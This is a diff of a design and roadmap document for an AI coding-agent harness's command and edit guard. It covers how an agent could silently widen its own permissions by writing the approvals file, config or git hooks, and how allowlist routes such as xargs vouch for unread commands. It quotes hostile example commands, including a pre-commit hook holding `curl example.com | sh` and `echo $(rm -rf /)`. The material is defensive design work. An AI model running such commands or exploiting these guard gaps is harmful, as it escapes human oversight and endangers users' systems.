@@ -952,6 +952,20 @@ required every term at once, a read cache that skipped the read shape the
 model actually uses. A dogfood session records counts in
 `_ai_/bench/dogfood.md`, and a count that surprises is the next lane.
 
+**Every addition pays for its tokens or its milliseconds.** The thesis is a
+small cache-stable context and a deterministic layer cheaper than a model
+turn, and both are easy to spend without noticing. A survey of fifteen
+harnesses on 2026-08-30 turned up more good mechanisms than this project
+should hold: an audit ledger, a falsifiability pass, a plugin surface, a
+connector fleet, a proxy that rewrites prompts in flight. Each one faces the
+test `wavez -preamble` already applies, which is what it costs a turn against
+what it saves one. A mechanism adding a tool, a schema, or a prompt section
+costs every turn forever and is measured before it ships. One running beside
+the model over changed files costs nothing the model sees and is measured for
+latency instead. Anything that cannot be stated in those terms goes to
+Considered and deferred however good it is, and a good idea that does not fit
+the constraint is the ordinary case rather than a near miss.
+
 **Ask each tier only what it can do.** An 8B model holds one file well and
 follows a short instruction with the answer already in front of it. It plans
 badly, and it cannot find what it was not handed. So a run that fails on the
@@ -1504,18 +1518,6 @@ audit (`_ai_/bench/audit-2026-08-18.md`), the frontier comparison
   comes first: how many prompts a write class raises over the replay corpus,
   since the reason edits are ungated is that gating each one would prompt on
   every turn
-- The files that govern the guard sit inside what the guard protects.
-  `.wavez/approvals.jsonl` holds every allow-always answer and `.wavez.pkl`
-  carries `shellAllow` and the argv each routine step runs, both under the
-  project root where containment passes any write and the edit tools reach
-  the gate not at all. One appended line widens what every later run may do
-  without a prompt. openworker floors this: `protected_paths()` is
-  unwritable in any mode through any tool, and a second list covers files
-  that execute on a later innocuous command (`.git/hooks/`,
-  `.github/workflows/`). This checkout carries both of those plus `hk.pkl`
-  and `.config/mise/conf.d/`. The work is a path list and one check in the
-  edit path, and it is the rare case where a fence is worth its cost,
-  because the escalation it stops is silent and permanent
 - Two routes onto the allowlist vouch for a command nobody read. `xargs` is
   on `defaultAllowed` and runs whatever follows it, and `mise run <task>`
   classifies as "the mise task" while the task body lives in
@@ -1539,8 +1541,70 @@ audit (`_ai_/bench/audit-2026-08-18.md`), the frontier comparison
   often a search precedes a fetch, since a prompt per search would be the
   whole tool
 
+- The guard splits a command string by hand and there is a parser for that.
+  [safecmd](https://github.com/AnswerDotAI/safecmd) validates by parsing bash
+  into an AST before it checks anything, on the argument that
+  `echo $(rm -rf /)` is invisible to prefix matching. The same parser is a Go
+  library rather than a binary here (`mvdan.cc/sh/v3/syntax`), so nothing
+  shells out and a verdict stays a pure function of the command text. It
+  closes two Considered-and-deferred entries at once, a heredoc body read as
+  commands and nested substitution, and replaces the redirection scan in
+  `writes.go` with the parse tree's own targets. The `Env` argument and the
+  expansion rules stay as they are, since a parser answers what a command is
+  and not what its variables hold
+- A finding needs a baseline, and [fallow](https://github.com/fallow-rs/fallow)
+  names the mechanism. The `lint` gate reads a changed file's whole package,
+  filters out what it cannot attribute to the run, and so says nothing about a
+  neighbor it just examined; the note above calls the fix a diff against the
+  count at the run's start. `fallow audit` does it as a stable fingerprint per
+  finding plus a base reference, which separates a new finding from an
+  inherited one without a count that moves when a file is renamed. The
+  fingerprint is the half worth copying, because the count is the version of
+  this that breaks
+- Trim gate output by what it is. Trimming keeps lines referencing a changed
+  file and falls back to the last 20, which is the right rule for a Go test
+  failure and for nothing else.
+  [toolshrink](https://github.com/unclecode/toolshrink) cuts by output shape (a
+  test run, a diff, a log, JSON) with a size-based fallback when no shape
+  matches, and reports 255 characters against head-and-tail's 1,904 on a
+  31,958-character vitest run. The recall handle it needs already ships here as
+  the spill file the omission line names, so what is missing is the shapes, and
+  the measurement is turns saved over the replay corpus rather than characters
+  saved
+- Try to refute a finding before reporting it.
+  [pr-af](https://github.com/Agent-Field/pr-af) runs a falsifiability pass over
+  each candidate (is this the intended design, is there a mitigation already,
+  is the behavior safe as written) and reports only the survivors. Two things
+  here take that shape: a gate finding a run answers by changing nothing, and
+  the open risk that a run's answer names a file and a function that do not
+  exist, where the refutation is a code-index lookup rather than a judgment.
+  Both are a `Condition` in `internal/condition`'s sense and belong there
+  rather than in a second reviewing model
+- A check that runs once can pass by luck.
+  [StyleProof](https://github.com/BenSheridanEdwards/StyleProof) captures every
+  surface twice and reports a mismatch as non-determinism rather than as a
+  difference, which is the general form of what
+  `TestPTY_SendsKeystrokesAndReadsWhatTheyDrew` needs and of what a gate green
+  on a loaded laptop is worth. A second pass is not free, so the version worth
+  building runs one only where the first changed a verdict, and
+  `StatusAbstained` is already the vocabulary for a result that decides nothing
+
 **Closed**, newest first, each with its lane dated in
 `_ai_/bench/dogfood.md`:
+
+- **The files that govern the guard are unwritable.** `guard.ProtectedWrite`
+  is one list and `Scope.Edit` is the one check, so every tool that writes
+  through it refuses in the permissive mode every run uses rather than only
+  under `-strict-scope`. Without the check `write` created
+  `.git/hooks/pre-commit` holding `curl example.com | sh`, and `str_replace`
+  rewrote an approved command in `.wavez/approvals.jsonl` into the same
+  string, which is what the tests assert against. The list is the approvals
+  and `.wavez.pkl`, plus the four places a body runs off an otherwise
+  innocuous command: `.git/` and `.jj/` at any depth, and `hk.pkl`,
+  `.github/workflows/`, `.config/mise.toml`, and `.config/mise/conf.d/` at
+  the root, so a fixture spelled `hk.pkl` under testdata is ordinary work.
+  The shell reads the same list, which widened a rule that had covered
+  `.git` alone
 
 - **Fuzzy suggestions and fuzzy ranking.** A refusal offers a near name only
   where the query occurs in it as a whole CamelCase or underscore word,
@@ -1659,8 +1723,8 @@ Likely later:
 
 - Risk scoring for a diff from deterministic signals (capability delta via `semgrep --baseline-commit` or `ast-grep`, blast radius from the import graph, signature change from tree-sitter). Argued in `_ai_/notes/is-it-risky-deterministically.md`. Belongs in Gates once the code-intelligence store exists (M3). Built once and removed: scoring a pending action against the whole run's change set put the answer on the wrong surface. A permission prompt asks about one command, so only the guard's verdict and the paths that command touches belong on it, while capability delta, file count, and blast radius describe the diff and answer a different question at a different time. The regex capability list was the other half of the problem: a `net/http` import in a Go repo reads as "network capability introduced", so the score sat at its top band permanently and the band decided nothing. Whatever replaces it renders per surface, and any capability signal parses rather than greps
 - A symlink inside the project that points out of it passes the guard's containment test, which compares paths lexically and never resolves them. `sandbox.Exec` already realpaths every path entering the Seatbelt profile for the same reason, so the technique is in the repo and the guard does not use it. Doing so would make a verdict depend on filesystem state, which is the invariant the `Env` argument exists to protect, so the resolution belongs in the caller beside the script reading
-- Expansion wider than the four names the guard knows. A shell resolves every variable, and this resolves the ones a destructive command usually hides a path behind; the rest fail closed, which is correct and noisy, since `rm -rf $BUILD_DIR` prompts every time. The fix is not a longer list but real resolution: either a parser that tracks assignments earlier in the same command line, or asking a shell to expand without executing and classifying the result. Both read state, so both belong behind the `Env` argument rather than inside the guard
-- A heredoc body is classified as if its lines were commands, because a newline separates commands and the guard does not track heredoc delimiters. It errs toward refusing (`cat <<EOF` containing `rm -rf /` is refused), so it is noise rather than a hole, and it is worth fixing only when it actually fires on real work
+- Expansion wider than the four names the guard knows. A shell resolves every variable, and this resolves the ones a destructive command usually hides a path behind; the rest fail closed, which is correct and noisy, since `rm -rf $BUILD_DIR` prompts every time. The fix is not a longer list but real resolution: either a parser that tracks assignments earlier in the same command line, or asking a shell to expand without executing and classifying the result. Both read state, so both belong behind the `Env` argument rather than inside the guard. A parse does not settle this either: it names where an expansion occurs and never what it holds
+- A heredoc body is classified as if its lines were commands, because a newline separates commands and the guard does not track heredoc delimiters. It errs toward refusing (`cat <<EOF` containing `rm -rf /` is refused), so it is noise rather than a hole, and it is worth fixing only when it actually fires on real work. `mvdan.cc/sh/v3/syntax` tracks the delimiter and would close it as a side effect of the parse above, which is the argument for doing the parse rather than this entry alone
 - Churn and bug-correlation per file or function. code-maat (Clojure CLI, CSV hotspots and coupling) and PyDriller (Python library for commit mining and SZZ pipelines) exist today, no maintained bare CLI for defect prediction does. Feeds the same risk score once the code-intelligence store exists
 - Merge-then-monitor: join merges against Sentry or health metrics after the fact to label outcomes. Separate tool, not a pre-merge gate
 - Merge-forward stacked PRs and review state that survives force-pushes (`_ai_/notes/merge-based-stacking.md`). Depends on the M4 VCS layer
